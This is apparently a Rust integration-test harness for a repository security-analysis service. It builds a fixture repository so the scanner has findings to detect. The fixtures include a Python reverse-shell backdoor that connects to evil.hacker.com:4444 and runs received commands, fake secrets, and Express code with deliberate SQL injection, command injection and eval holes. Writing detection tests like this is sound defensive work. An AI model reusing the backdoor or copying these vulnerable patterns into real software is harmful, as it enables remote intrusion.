use anyhow::Result;
use repository_analysis_service::*;
use std::sync::Arc;
use uuid::Uuid;
use chrono::Utc;
use tempfile::TempDir;
use tokio::time::{sleep, Duration};

pub mod api_tests;
pub mod storage_tests;
pub mod analysis_tests;
pub mod event_tests;
pub mod forensics_tests;

/// Test context for integration tests
pub struct TestContext {
    pub temp_dir: TempDir,
    pub config: config::Config,
    pub storage: Arc<storage::Storage>,
    pub analysis_engine: Arc<analysis::AnalysisEngine>,
    pub event_publisher: Arc<events::publisher::EventPublisher>,
    pub forensics_manager: Arc<forensics::ForensicsManager>,
}

impl TestContext {
    /// Create a new test context with all services initialized
    pub async fn new() -> Result<Self> {
        // Create temp directory for test files
        let temp_dir = TempDir::new()?;
        
        // Create test configuration
        let mut config = config::Config::default();
        
        // Use in-memory/local storage for tests
        config.storage.object.provider = "local".to_string();
        config.storage.object.local_path = Some(temp_dir.path().join("objects").to_string_lossy().to_string());
        
        // Initialize storage (using test databases)
        let postgres = storage::postgres::PostgresStorage::new(&config.storage.postgres).await?;
        postgres.migrate().await?;
        
        let object_storage = storage::object::ObjectStorage::new(&config.storage.object).await?;
        
        let vector_storage = storage::vector::QdrantStorage::new(&config.storage.vector).await?;
        vector_storage.initialize_collections().await?;
        
        let storage = Arc::new(storage::Storage::new(postgres, object_storage, vector_storage));
        
        // Initialize event publisher
        let event_publisher = Arc::new(
            events::publisher::EventPublisher::new(&config.pulsar, config.distributed_networks.clone()).await?
        );
        
        // Initialize analysis engine
        let analysis_engine = Arc::new(
            analysis::AnalysisEngine::new(config.analysis.clone(), storage.clone(), event_publisher.clone()).await?
        );
        
        // Initialize forensics manager
        let forensics_manager = Arc::new(
            forensics::ForensicsManager::new(config.forensics.clone(), storage.clone()).await?
        );
        
        Ok(Self {
            temp_dir,
            config,
            storage,
            analysis_engine,
            event_publisher,
            forensics_manager,
        })
    }
    
    /// Create a test repository with sample files
    pub async fn create_test_repository(&self, name: &str) -> Result<String> {
        let repo_path = self.temp_dir.path().join(name);
        tokio::fs::create_dir_all(&repo_path).await?;
        
        // Create sample files
        self.create_test_file(&repo_path, "README.md", "# Test Repository\n\nThis is a test repository for integration testing.").await?;
        self.create_test_file(&repo_path, "src/main.rs", r#"
fn main() {
    println!("Hello, world!");
}

#[cfg(test)]
mod tests {
    #[test]
    fn test_main() {
        assert_eq!(2 + 2, 4);
    }
}
"#).await?;
        
        // Create a file with security issues
        self.create_test_file(&repo_path, "config/secrets.json", r#"{
    "api_key": "AKIAIOSFODNN7EXAMPLE",
    "database_password": "SuperSecret123!",
    "jwt_secret": "my-super-secret-jwt-key",
    "stripe_key": "sk_test_FAKE_KEY_FOR_TESTING"
}"#).await?;
        
        // Create a suspicious file
        self.create_test_file(&repo_path, "scripts/backdoor.py", r#"
import socket
import subprocess
import os

# Suspicious backdoor code
def connect_to_c2():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("evil.hacker.com", 4444))
    
    while True:
        command = s.recv(1024).decode()
        if command.lower() == "exit":
            break
        output = subprocess.getoutput(command)
        s.send(output.encode())
    
    s.close()

if __name__ == "__main__":
    connect_to_c2()
"#).await?;
        
        // Create vulnerable code
        self.create_test_file(&repo_path, "src/vulnerable.js", r#"
const express = require('express');
const app = express();

// SQL Injection vulnerability
app.get('/user', (req, res) => {
    const userId = req.query.id;
    const query = `SELECT * FROM users WHERE id = ${userId}`;
    db.query(query, (err, result) => {
        res.json(result);
    });
});

// Command injection vulnerability
app.post('/ping', (req, res) => {
    const host = req.body.host;
    exec(`ping -c 4 ${host}`, (err, stdout) => {
        res.send(stdout);
    });
});

// Eval vulnerability
app.post('/calculate', (req, res) => {
    const expression = req.body.expression;
    const result = eval(expression);
    res.json({ result });
});
"#).await?;
        
        Ok(repo_path.to_string_lossy().to_string())
    }
    
    /// Create a test file
    async fn create_test_file(&self, repo_path: &std::path::Path, relative_path: &str, content: &str) -> Result<()> {
        let file_path = repo_path.join(relative_path);
        if let Some(parent) = file_path.parent() {
            tokio::fs::create_dir_all(parent).await?;
        }
        tokio::fs::write(file_path, content).await?;
        Ok(())
    }
    
    /// Create a test job
    pub fn create_test_job(&self, repository_url: String) -> storage::AnalysisJob {
        storage::AnalysisJob {
            id: Uuid::new_v4(),
            repository_url,
            repository_type: "directory".to_string(),
            analysis_type: "comprehensive".to_string(),
            priority: storage::Priority::Normal,
            status: storage::JobStatus::Pending,
            submitter_id: "test-user".to_string(),
            case_number: Some("TEST-001".to_string()),
            configuration: serde_json::json!({
                "include_git_history": false,
                "deep_scan": true,
            }),
            started_at: None,
            completed_at: None,
            error_message: None,
            progress_percentage: 0,
            current_phase: None,
            created_at: Utc::now(),
            updated_at: Utc::now(),
        }
    }
    
    /// Submit a job and wait for completion
    pub async fn submit_and_wait_for_job(&self, job: &storage::AnalysisJob) -> Result<storage::AnalysisJob> {
        // Store job in database
        self.storage.postgres.create_job(job).await?;
        
        // Start analysis
        self.analysis_engine.start_analysis(job).await?;
        
        // Wait for completion (with timeout)
        let start = std::time::Instant::now();
        let timeout = std::time::Duration::from_secs(60);
        
        loop {
            if start.elapsed() > timeout {
                anyhow::bail!("Job timeout");
            }
            
            let updated_job = self.storage.postgres.get_job(job.id).await?
                .ok_or_else(|| anyhow::anyhow!("Job not found"))?;
            
            match updated_job.status {
                storage::JobStatus::Completed => return Ok(updated_job),
                storage::JobStatus::Failed => {
                    anyhow::bail!("Job failed: {:?}", updated_job.error_message);
                }
                _ => {
                    sleep(Duration::from_millis(500)).await;
                }
            }
        }
    }
    
    /// Get all security findings for a job
    pub async fn get_job_findings(&self, job_id: Uuid) -> Result<Vec<storage::SecurityFinding>> {
        self.storage.postgres.get_job_findings(job_id).await
    }
    
    /// Cleanup test context
    pub async fn cleanup(self) -> Result<()> {
        // Clean up test data from databases
        // In a real test environment, we might use transactions or separate test databases
        
        // Shutdown services gracefully
        if let Err(e) = self.event_publisher.shutdown().await {
            eprintln!("Failed to shutdown event publisher: {}", e);
        }
        
        Ok(())
    }
}

/// Run all integration tests
pub async fn run_all_tests() -> Result<()> {
    println!("Running Repository Analysis Service Integration Tests");
    println!("=" .repeat(60));
    
    // Run test suites
    api_tests::run_tests().await?;
    storage_tests::run_tests().await?;
    analysis_tests::run_tests().await?;
    event_tests::run_tests().await?;
    forensics_tests::run_tests().await?;
    
    println!("\n" + &"=".repeat(60));
    println!("All integration tests passed! ✅");
    
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[tokio::test]
    async fn test_context_creation() {
        let context = TestContext::new().await.unwrap();
        assert!(context.temp_dir.path().exists());
        context.cleanup().await.unwrap();
    }
    
    #[tokio::test]
    async fn test_repository_creation() {
        let context = TestContext::new().await.unwrap();
        let repo_path = context.create_test_repository("test-repo").await.unwrap();
        
        // Verify files were created
        let readme_path = std::path::Path::new(&repo_path).join("README.md");
        assert!(tokio::fs::metadata(&readme_path).await.is_ok());
        
        context.cleanup().await.unwrap();
    }
}